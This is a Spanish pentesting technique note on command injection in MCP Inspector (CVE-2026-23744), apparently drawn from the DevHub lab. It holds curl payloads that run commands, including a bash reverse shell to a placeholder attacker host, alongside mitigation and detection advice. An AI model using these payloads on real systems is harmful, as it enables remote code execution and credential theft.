---
topic: MCP Inspector — inyección de comandos al conectar servidores
tags: [web, mcp, command-injection, rce, devhub]
---

# MCP Inspector — inyección de comandos al conectar servidores

[🇬🇧 English](mcp-server-command-injection.en.md) | **Español**

## Concepto

Los inspectores de MCP (Model Context Protocol) permiten configurar servidores locales por `stdio`. Para ello reciben un comando y argumentos y los ejecutan con `child_process.spawn`. Si la API que acepta esa configuración no valida ni separa los argumentos, un atacante puede enviar un comando arbitrario y obtener ejecución en el host que aloja el inspector.

MCPJam Inspector 1.4.2 es vulnerable (CVE-2026-23744): `POST /api/mcp/connect` acepta el comando del servidor y lo pasa a `spawn` sin sanear.

## Cuándo aplica

- Inspector o panel MCP expuesto en red, no solo en `127.0.0.1`.
- Endpoint de conexión que acepta `command`, `args`, `transport` o una URL de servidor.
- El proceso corre con un usuario con acceso a secretos o al resto del host.
- No hay autenticación o el panel usa credenciales por defecto.

## Procedimiento

1. Localizar el inspector (`3000`, `6274`, `8080`, `/api/mcp`).
2. Identificar el endpoint de conexión y el esquema JSON que espera.
3. Enviar un comando de prueba (`id`, `whoami`) y observar la respuesta o el callback.
4. Cambiar a una reverse shell o a una lectura de archivos.
5. En DevHub, el inspector permitía conectar a un servidor MCP y ejecutar comandos; la cadena continuaba con Jupyter y OPSMCP.

## Comandos

```bash
curl -s -X POST http://<HOST>:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"transport":"stdio","command":"id","args":[]}'
```

```bash
curl -s -X POST http://<HOST>:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"transport":"stdio","command":"bash","args":["-c","bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"]}'
```

Si el campo se concatena en una cadena:

```json
{"command":"node server.js; id"}
```

## Variantes

- Inyectar en `args` si el binario es fijo pero los argumentos no se escapan.
- Usar `npx`, `uvx` o `python -c` como ejecutables permitidos.
- Conectar a un servidor MCP controlado por el atacante para robar tokens o responder con herramientas maliciosas.
- Encadenar la ejecución con la lectura de variables de entorno del inspector.

## Limitaciones

- Muchos inspectores solo escuchan en loopback; hace falta SSRF, túnel o acceso local.
- Un `spawn` con array de argumentos no es inyectable; hay que buscar concatenación o `shell: true`.
- Contenedores sin shell ni red limitan el payload.
- El endpoint puede exigir una sesión o un token CSRF.

## Mitigación

- No exponer inspectores de desarrollo fuera de loopback.
- Usar allowlist de ejecutables y argumentos, sin `shell: true`.
- Autenticar y autorizar el endpoint; exigir same-origin y CSRF.
- Ejecutar el inspector en un contenedor sin secretos ni montajes del host.
- Actualizar MCPJam Inspector a una versión corregida.

## Detección

- Peticiones a `/api/mcp/connect` con `command` fuera de la allowlist.
- Procesos hijos del inspector ejecutando `bash`, `sh`, `powershell` o `curl`.
- Conexiones salientes desde el puerto del inspector.
- Cambios en la configuración de servidores MCP.

## Referencias

- [NVD — CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [MCP — Seguridad](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices)
- [0xdf — DevHub](https://0xdf.gitlab.io/2026/01/24/htb-devhub.html)
- [Ficha DevHub](../../machines/linux/devhub/README.md)
